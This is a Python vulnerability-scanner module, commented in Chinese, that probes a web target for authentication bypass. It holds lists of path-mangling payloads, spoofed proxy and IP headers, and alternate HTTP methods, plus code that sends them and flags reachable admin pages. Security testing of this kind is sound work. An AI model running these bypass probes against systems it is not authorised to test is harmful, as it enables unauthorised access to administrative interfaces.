#!/usr/bin/env python3
"""
认证绕过检测器 - 基于 BaseDetector 重构

支持检测类型:
- 路径绕过 (Path Bypass)
- 头部绕过 (Header Bypass)
- HTTP 方法绕过
- 参数污染绕过
"""

import os
import sys
from typing import Any, Dict, List, Optional

# 导入 requests 用于异常处理
try:
    import requests

    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

sys.path.insert(
    0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
)

from tools.detectors.base import BaseDetector, Vulnerability


class AuthBypassDetector(BaseDetector):
    """认证绕过检测器"""

    # 路径绕过 Payload
    PATH_BYPASS_PAYLOADS = [
        "/admin",
        "/admin/",
        "/admin//",
        "/admin/./",
        "/Admin",
        "/ADMIN",
        "/administrator",
        "/admin%20",
        "/admin%00",
        "/admin..;/",
        "/admin;",
        "/admin.json",
        "/admin.html",
        "//admin",
        "///admin",
        "/./admin",
        "/admin?",
        "/admin#",
        "/admin%2f",
        "/admin/..;/admin",
        "/admin%09",
        "/admin%0a",
        "/admin%0d",
        "/admin/~",
        "/admin/..",
    ]

    # 头部绕过 Payload
    HEADER_BYPASS_PAYLOADS = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Cluster-Client-IP": "127.0.0.1"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"Via": "1.1 localhost"},
    ]

    # HTTP 方法绕过
    METHOD_BYPASS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

    # SPA 误报指示器
    SPA_INDICATORS = [
        "<!doctype html>",
        '<div id="root">',
        '<div id="app">',
        "react",
        "vue",
        "angular",
        "webpack",
        "bundle.js",
        "__NEXT_DATA__",
        "__NUXT__",
        "window.__INITIAL_STATE__",
    ]

    # 真实管理页面指示器
    ADMIN_INDICATORS = [
        "dashboard",
        "管理",
        "admin panel",
        "control panel",
        "settings",
        "configuration",
        "users",
        "logout",
        "welcome admin",
        "管理员",
        "后台",
    ]

    def get_payloads(self) -> Dict[str, List]:
        """获取 Payload 库"""
        return {
            "Path Bypass": self.PATH_BYPASS_PAYLOADS,
            "Header Bypass": self.HEADER_BYPASS_PAYLOADS,
            "Method Bypass": self.METHOD_BYPASS,
        }

    def validate_response(
        self, response: Dict[str, Any], payload: str, baseline: Dict[str, Any] = None
    ) -> bool:
        """验证响应是否表明存在认证绕过"""
        if not response or not response.get("success"):
            return False

        status_code = response.get("status_code", 0)
        resp_text = response.get("response_text", "").lower()

        # 状态码检查
        if status_code != 200:
            return False

        # SPA 误报过滤
        if self._is_spa_fallback(resp_text, baseline):
            return False

        # 检查是否有真实管理页面内容
        if self._has_admin_content(resp_text):
            return True

        return False

    def _is_spa_fallback(self, resp_text: str, baseline: Dict[str, Any] = None) -> bool:
        """检测是否为 SPA 回退页面"""
        resp_lower = resp_text.lower()

        # 检查 SPA 指示器
        spa_count = sum(1 for indicator in self.SPA_INDICATORS if indicator in resp_lower)
        if spa_count >= 2:
            return True

        # 如果有基线，比较响应相似度
        if baseline:
            baseline_text = baseline.get("response_text", "")
            if baseline_text:
                # 简单的相似度检查
                similarity = self._calculate_similarity(resp_text, baseline_text)
                if similarity > 0.9:  # 90% 相似度认为是相同页面
                    return True

        return False

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """计算两个文本的相似度"""
        if not text1 or not text2:
            return 0.0

        # 简单的长度比较
        len1, len2 = len(text1), len(text2)
        if len1 == 0 and len2 == 0:
            return 1.0

        # 长度差异过大则不相似
        if abs(len1 - len2) / max(len1, len2) > 0.1:
            return 0.0

        # 简单的字符匹配
        matches = sum(1 for a, b in zip(text1[:1000], text2[:1000]) if a == b)
        return matches / min(len1, len2, 1000)

    def _has_admin_content(self, resp_text: str) -> bool:
        """检查是否包含真实管理页面内容"""
        resp_lower = resp_text.lower()
        return any(indicator in resp_lower for indicator in self.ADMIN_INDICATORS)

    def detect_path_bypass(self, url: str, target_path: str = "/admin") -> List[Vulnerability]:
        """检测路径绕过"""
        vulnerabilities = []
        base_url = url.rstrip("/")

        # 获取基线响应
        baseline = self.get_baseline(base_url + target_path)

        for path in self.PATH_BYPASS_PAYLOADS:
            test_url = base_url + path

            try:
                if not self.session:
                    continue

                resp = self.session.get(
                    test_url,
                    headers={"User-Agent": self.user_agent},
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                )

                if resp.status_code != 200:
                    continue

                resp_text = resp.text.lower()

                # SPA 误报过滤
                if self._is_spa_fallback(resp_text, baseline):
                    continue

                # 检查是否有管理内容
                has_admin = self._has_admin_content(resp_text)
                confidence = 0.8 if has_admin else 0.5

                vulnerabilities.append(
                    Vulnerability(
                        type="Path Bypass",
                        severity="HIGH" if confidence > 0.7 else "MEDIUM",
                        url=test_url,
                        payload=path,
                        evidence=f"路径绕过成功: {path}",
                        verified=has_admin,
                        confidence=confidence,
                        details={
                            "path": path,
                            "status_code": resp.status_code,
                            "has_admin_content": has_admin,
                            "response_length": len(resp.text),
                        },
                    )
                )

            except (requests.RequestException, OSError) if HAS_REQUESTS else OSError:
                continue

        return vulnerabilities

    def detect_header_bypass(self, url: str, target_path: str = "/admin") -> List[Vulnerability]:
        """检测头部绕过"""
        vulnerabilities = []
        base_url = url.rstrip("/")
        test_url = base_url + target_path

        # 获取基线响应
        baseline = self.get_baseline(test_url)

        for headers in self.HEADER_BYPASS_PAYLOADS:
            try:
                if not self.session:
                    continue

                full_headers = {"User-Agent": self.user_agent, **headers}
                resp = self.session.get(
                    test_url,
                    headers=full_headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                )

                if resp.status_code != 200:
                    continue

                resp_text = resp.text.lower()

                # SPA 误报过滤
                if self._is_spa_fallback(resp_text, baseline):
                    continue

                # 检查是否有管理内容
                has_admin = self._has_admin_content(resp_text)
                confidence = 0.8 if has_admin else 0.5

                header_name = list(headers.keys())[0]
                header_value = list(headers.values())[0]

                vulnerabilities.append(
                    Vulnerability(
                        type="Header Bypass",
                        severity="HIGH" if confidence > 0.7 else "MEDIUM",
                        url=test_url,
                        payload=f"{header_name}: {header_value}",
                        evidence=f"头部绕过成功: {header_name}",
                        verified=has_admin,
                        confidence=confidence,
                        details={
                            "header": headers,
                            "status_code": resp.status_code,
                            "has_admin_content": has_admin,
                            "response_length": len(resp.text),
                        },
                    )
                )

            except (requests.RequestException, OSError) if HAS_REQUESTS else OSError:
                continue

        return vulnerabilities

    def detect_method_bypass(self, url: str, target_path: str = "/admin") -> List[Vulnerability]:
        """检测 HTTP 方法绕过"""
        vulnerabilities = []
        base_url = url.rstrip("/")
        test_url = base_url + target_path

        # 获取 GET 基线
        baseline = self.get_baseline(test_url)
        baseline_status = baseline.get("status_code", 0) if baseline else 0

        for method in self.METHOD_BYPASS:
            if method == "GET":
                continue  # 跳过 GET，已作为基线

            try:
                if not self.session:
                    continue

                resp = self.session.request(
                    method,
                    test_url,
                    headers={"User-Agent": self.user_agent},
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                )

                # 检查是否绕过 (原本 403/401 变成 200)
                if baseline_status in [401, 403] and resp.status_code == 200:
                    vulnerabilities.append(
                        Vulnerability(
                            type="HTTP Method Bypass",
                            severity="HIGH",
                            url=test_url,
                            payload=method,
                            evidence=f"HTTP 方法绕过: {method} 返回 200 (原 {baseline_status})",
                            verified=True,
                            confidence=0.85,
                            details={
                                "method": method,
                                "original_status": baseline_status,
                                "bypass_status": resp.status_code,
                                "response_length": len(resp.text),
                            },
                        )
                    )

            except (requests.RequestException, OSError) if HAS_REQUESTS else OSError:
                continue

        return vulnerabilities

    def detect(
        self, url: str, param: Optional[str] = None, deep_scan: bool = True
    ) -> Dict[str, Any]:
        """
        认证绕过检测入口

        Args:
            url: 目标 URL
            param: 目标路径 (默认 /admin)
            deep_scan: 是否深度扫描 (包含方法绕过)

        Returns:
            检测结果字典
        """
        target_path = param or "/admin"
        all_vulnerabilities = []
        filtered_count = 0

        # 1. 路径绕过检测
        path_vulns = self.detect_path_bypass(url, target_path)
        all_vulnerabilities.extend(path_vulns)

        # 2. 头部绕过检测
        header_vulns = self.detect_header_bypass(url, target_path)
        all_vulnerabilities.extend(header_vulns)

        if deep_scan:
            # 3. HTTP 方法绕过检测
            method_vulns = self.detect_method_bypass(url, target_path)
            all_vulnerabilities.extend(method_vulns)

        # 按置信度排序
        all_vulnerabilities.sort(key=lambda v: v.confidence, reverse=True)

        return {
            "success": True,
            "url": url,
            "target_path": target_path,
            "detector": self.__class__.__name__,
            "vulnerabilities": [v.to_dict() for v in all_vulnerabilities],
            "total": len(all_vulnerabilities),
            "verified_count": sum(1 for v in all_vulnerabilities if v.verified),
            "by_type": {
                "path_bypass": sum(1 for v in all_vulnerabilities if "Path" in v.type),
                "header_bypass": sum(1 for v in all_vulnerabilities if "Header" in v.type),
                "method_bypass": sum(1 for v in all_vulnerabilities if "Method" in v.type),
            },
            "filtered_spa_fallback": filtered_count,
        }


# 便捷函数 - 兼容旧接口
def auth_bypass_detect(
    url: str, target_path: str = "/admin", deep_scan: bool = True
) -> Dict[str, Any]:
    """认证绕过检测 (兼容旧接口)"""
    with AuthBypassDetector() as detector:
        return detector.detect(url, param=target_path, deep_scan=deep_scan)
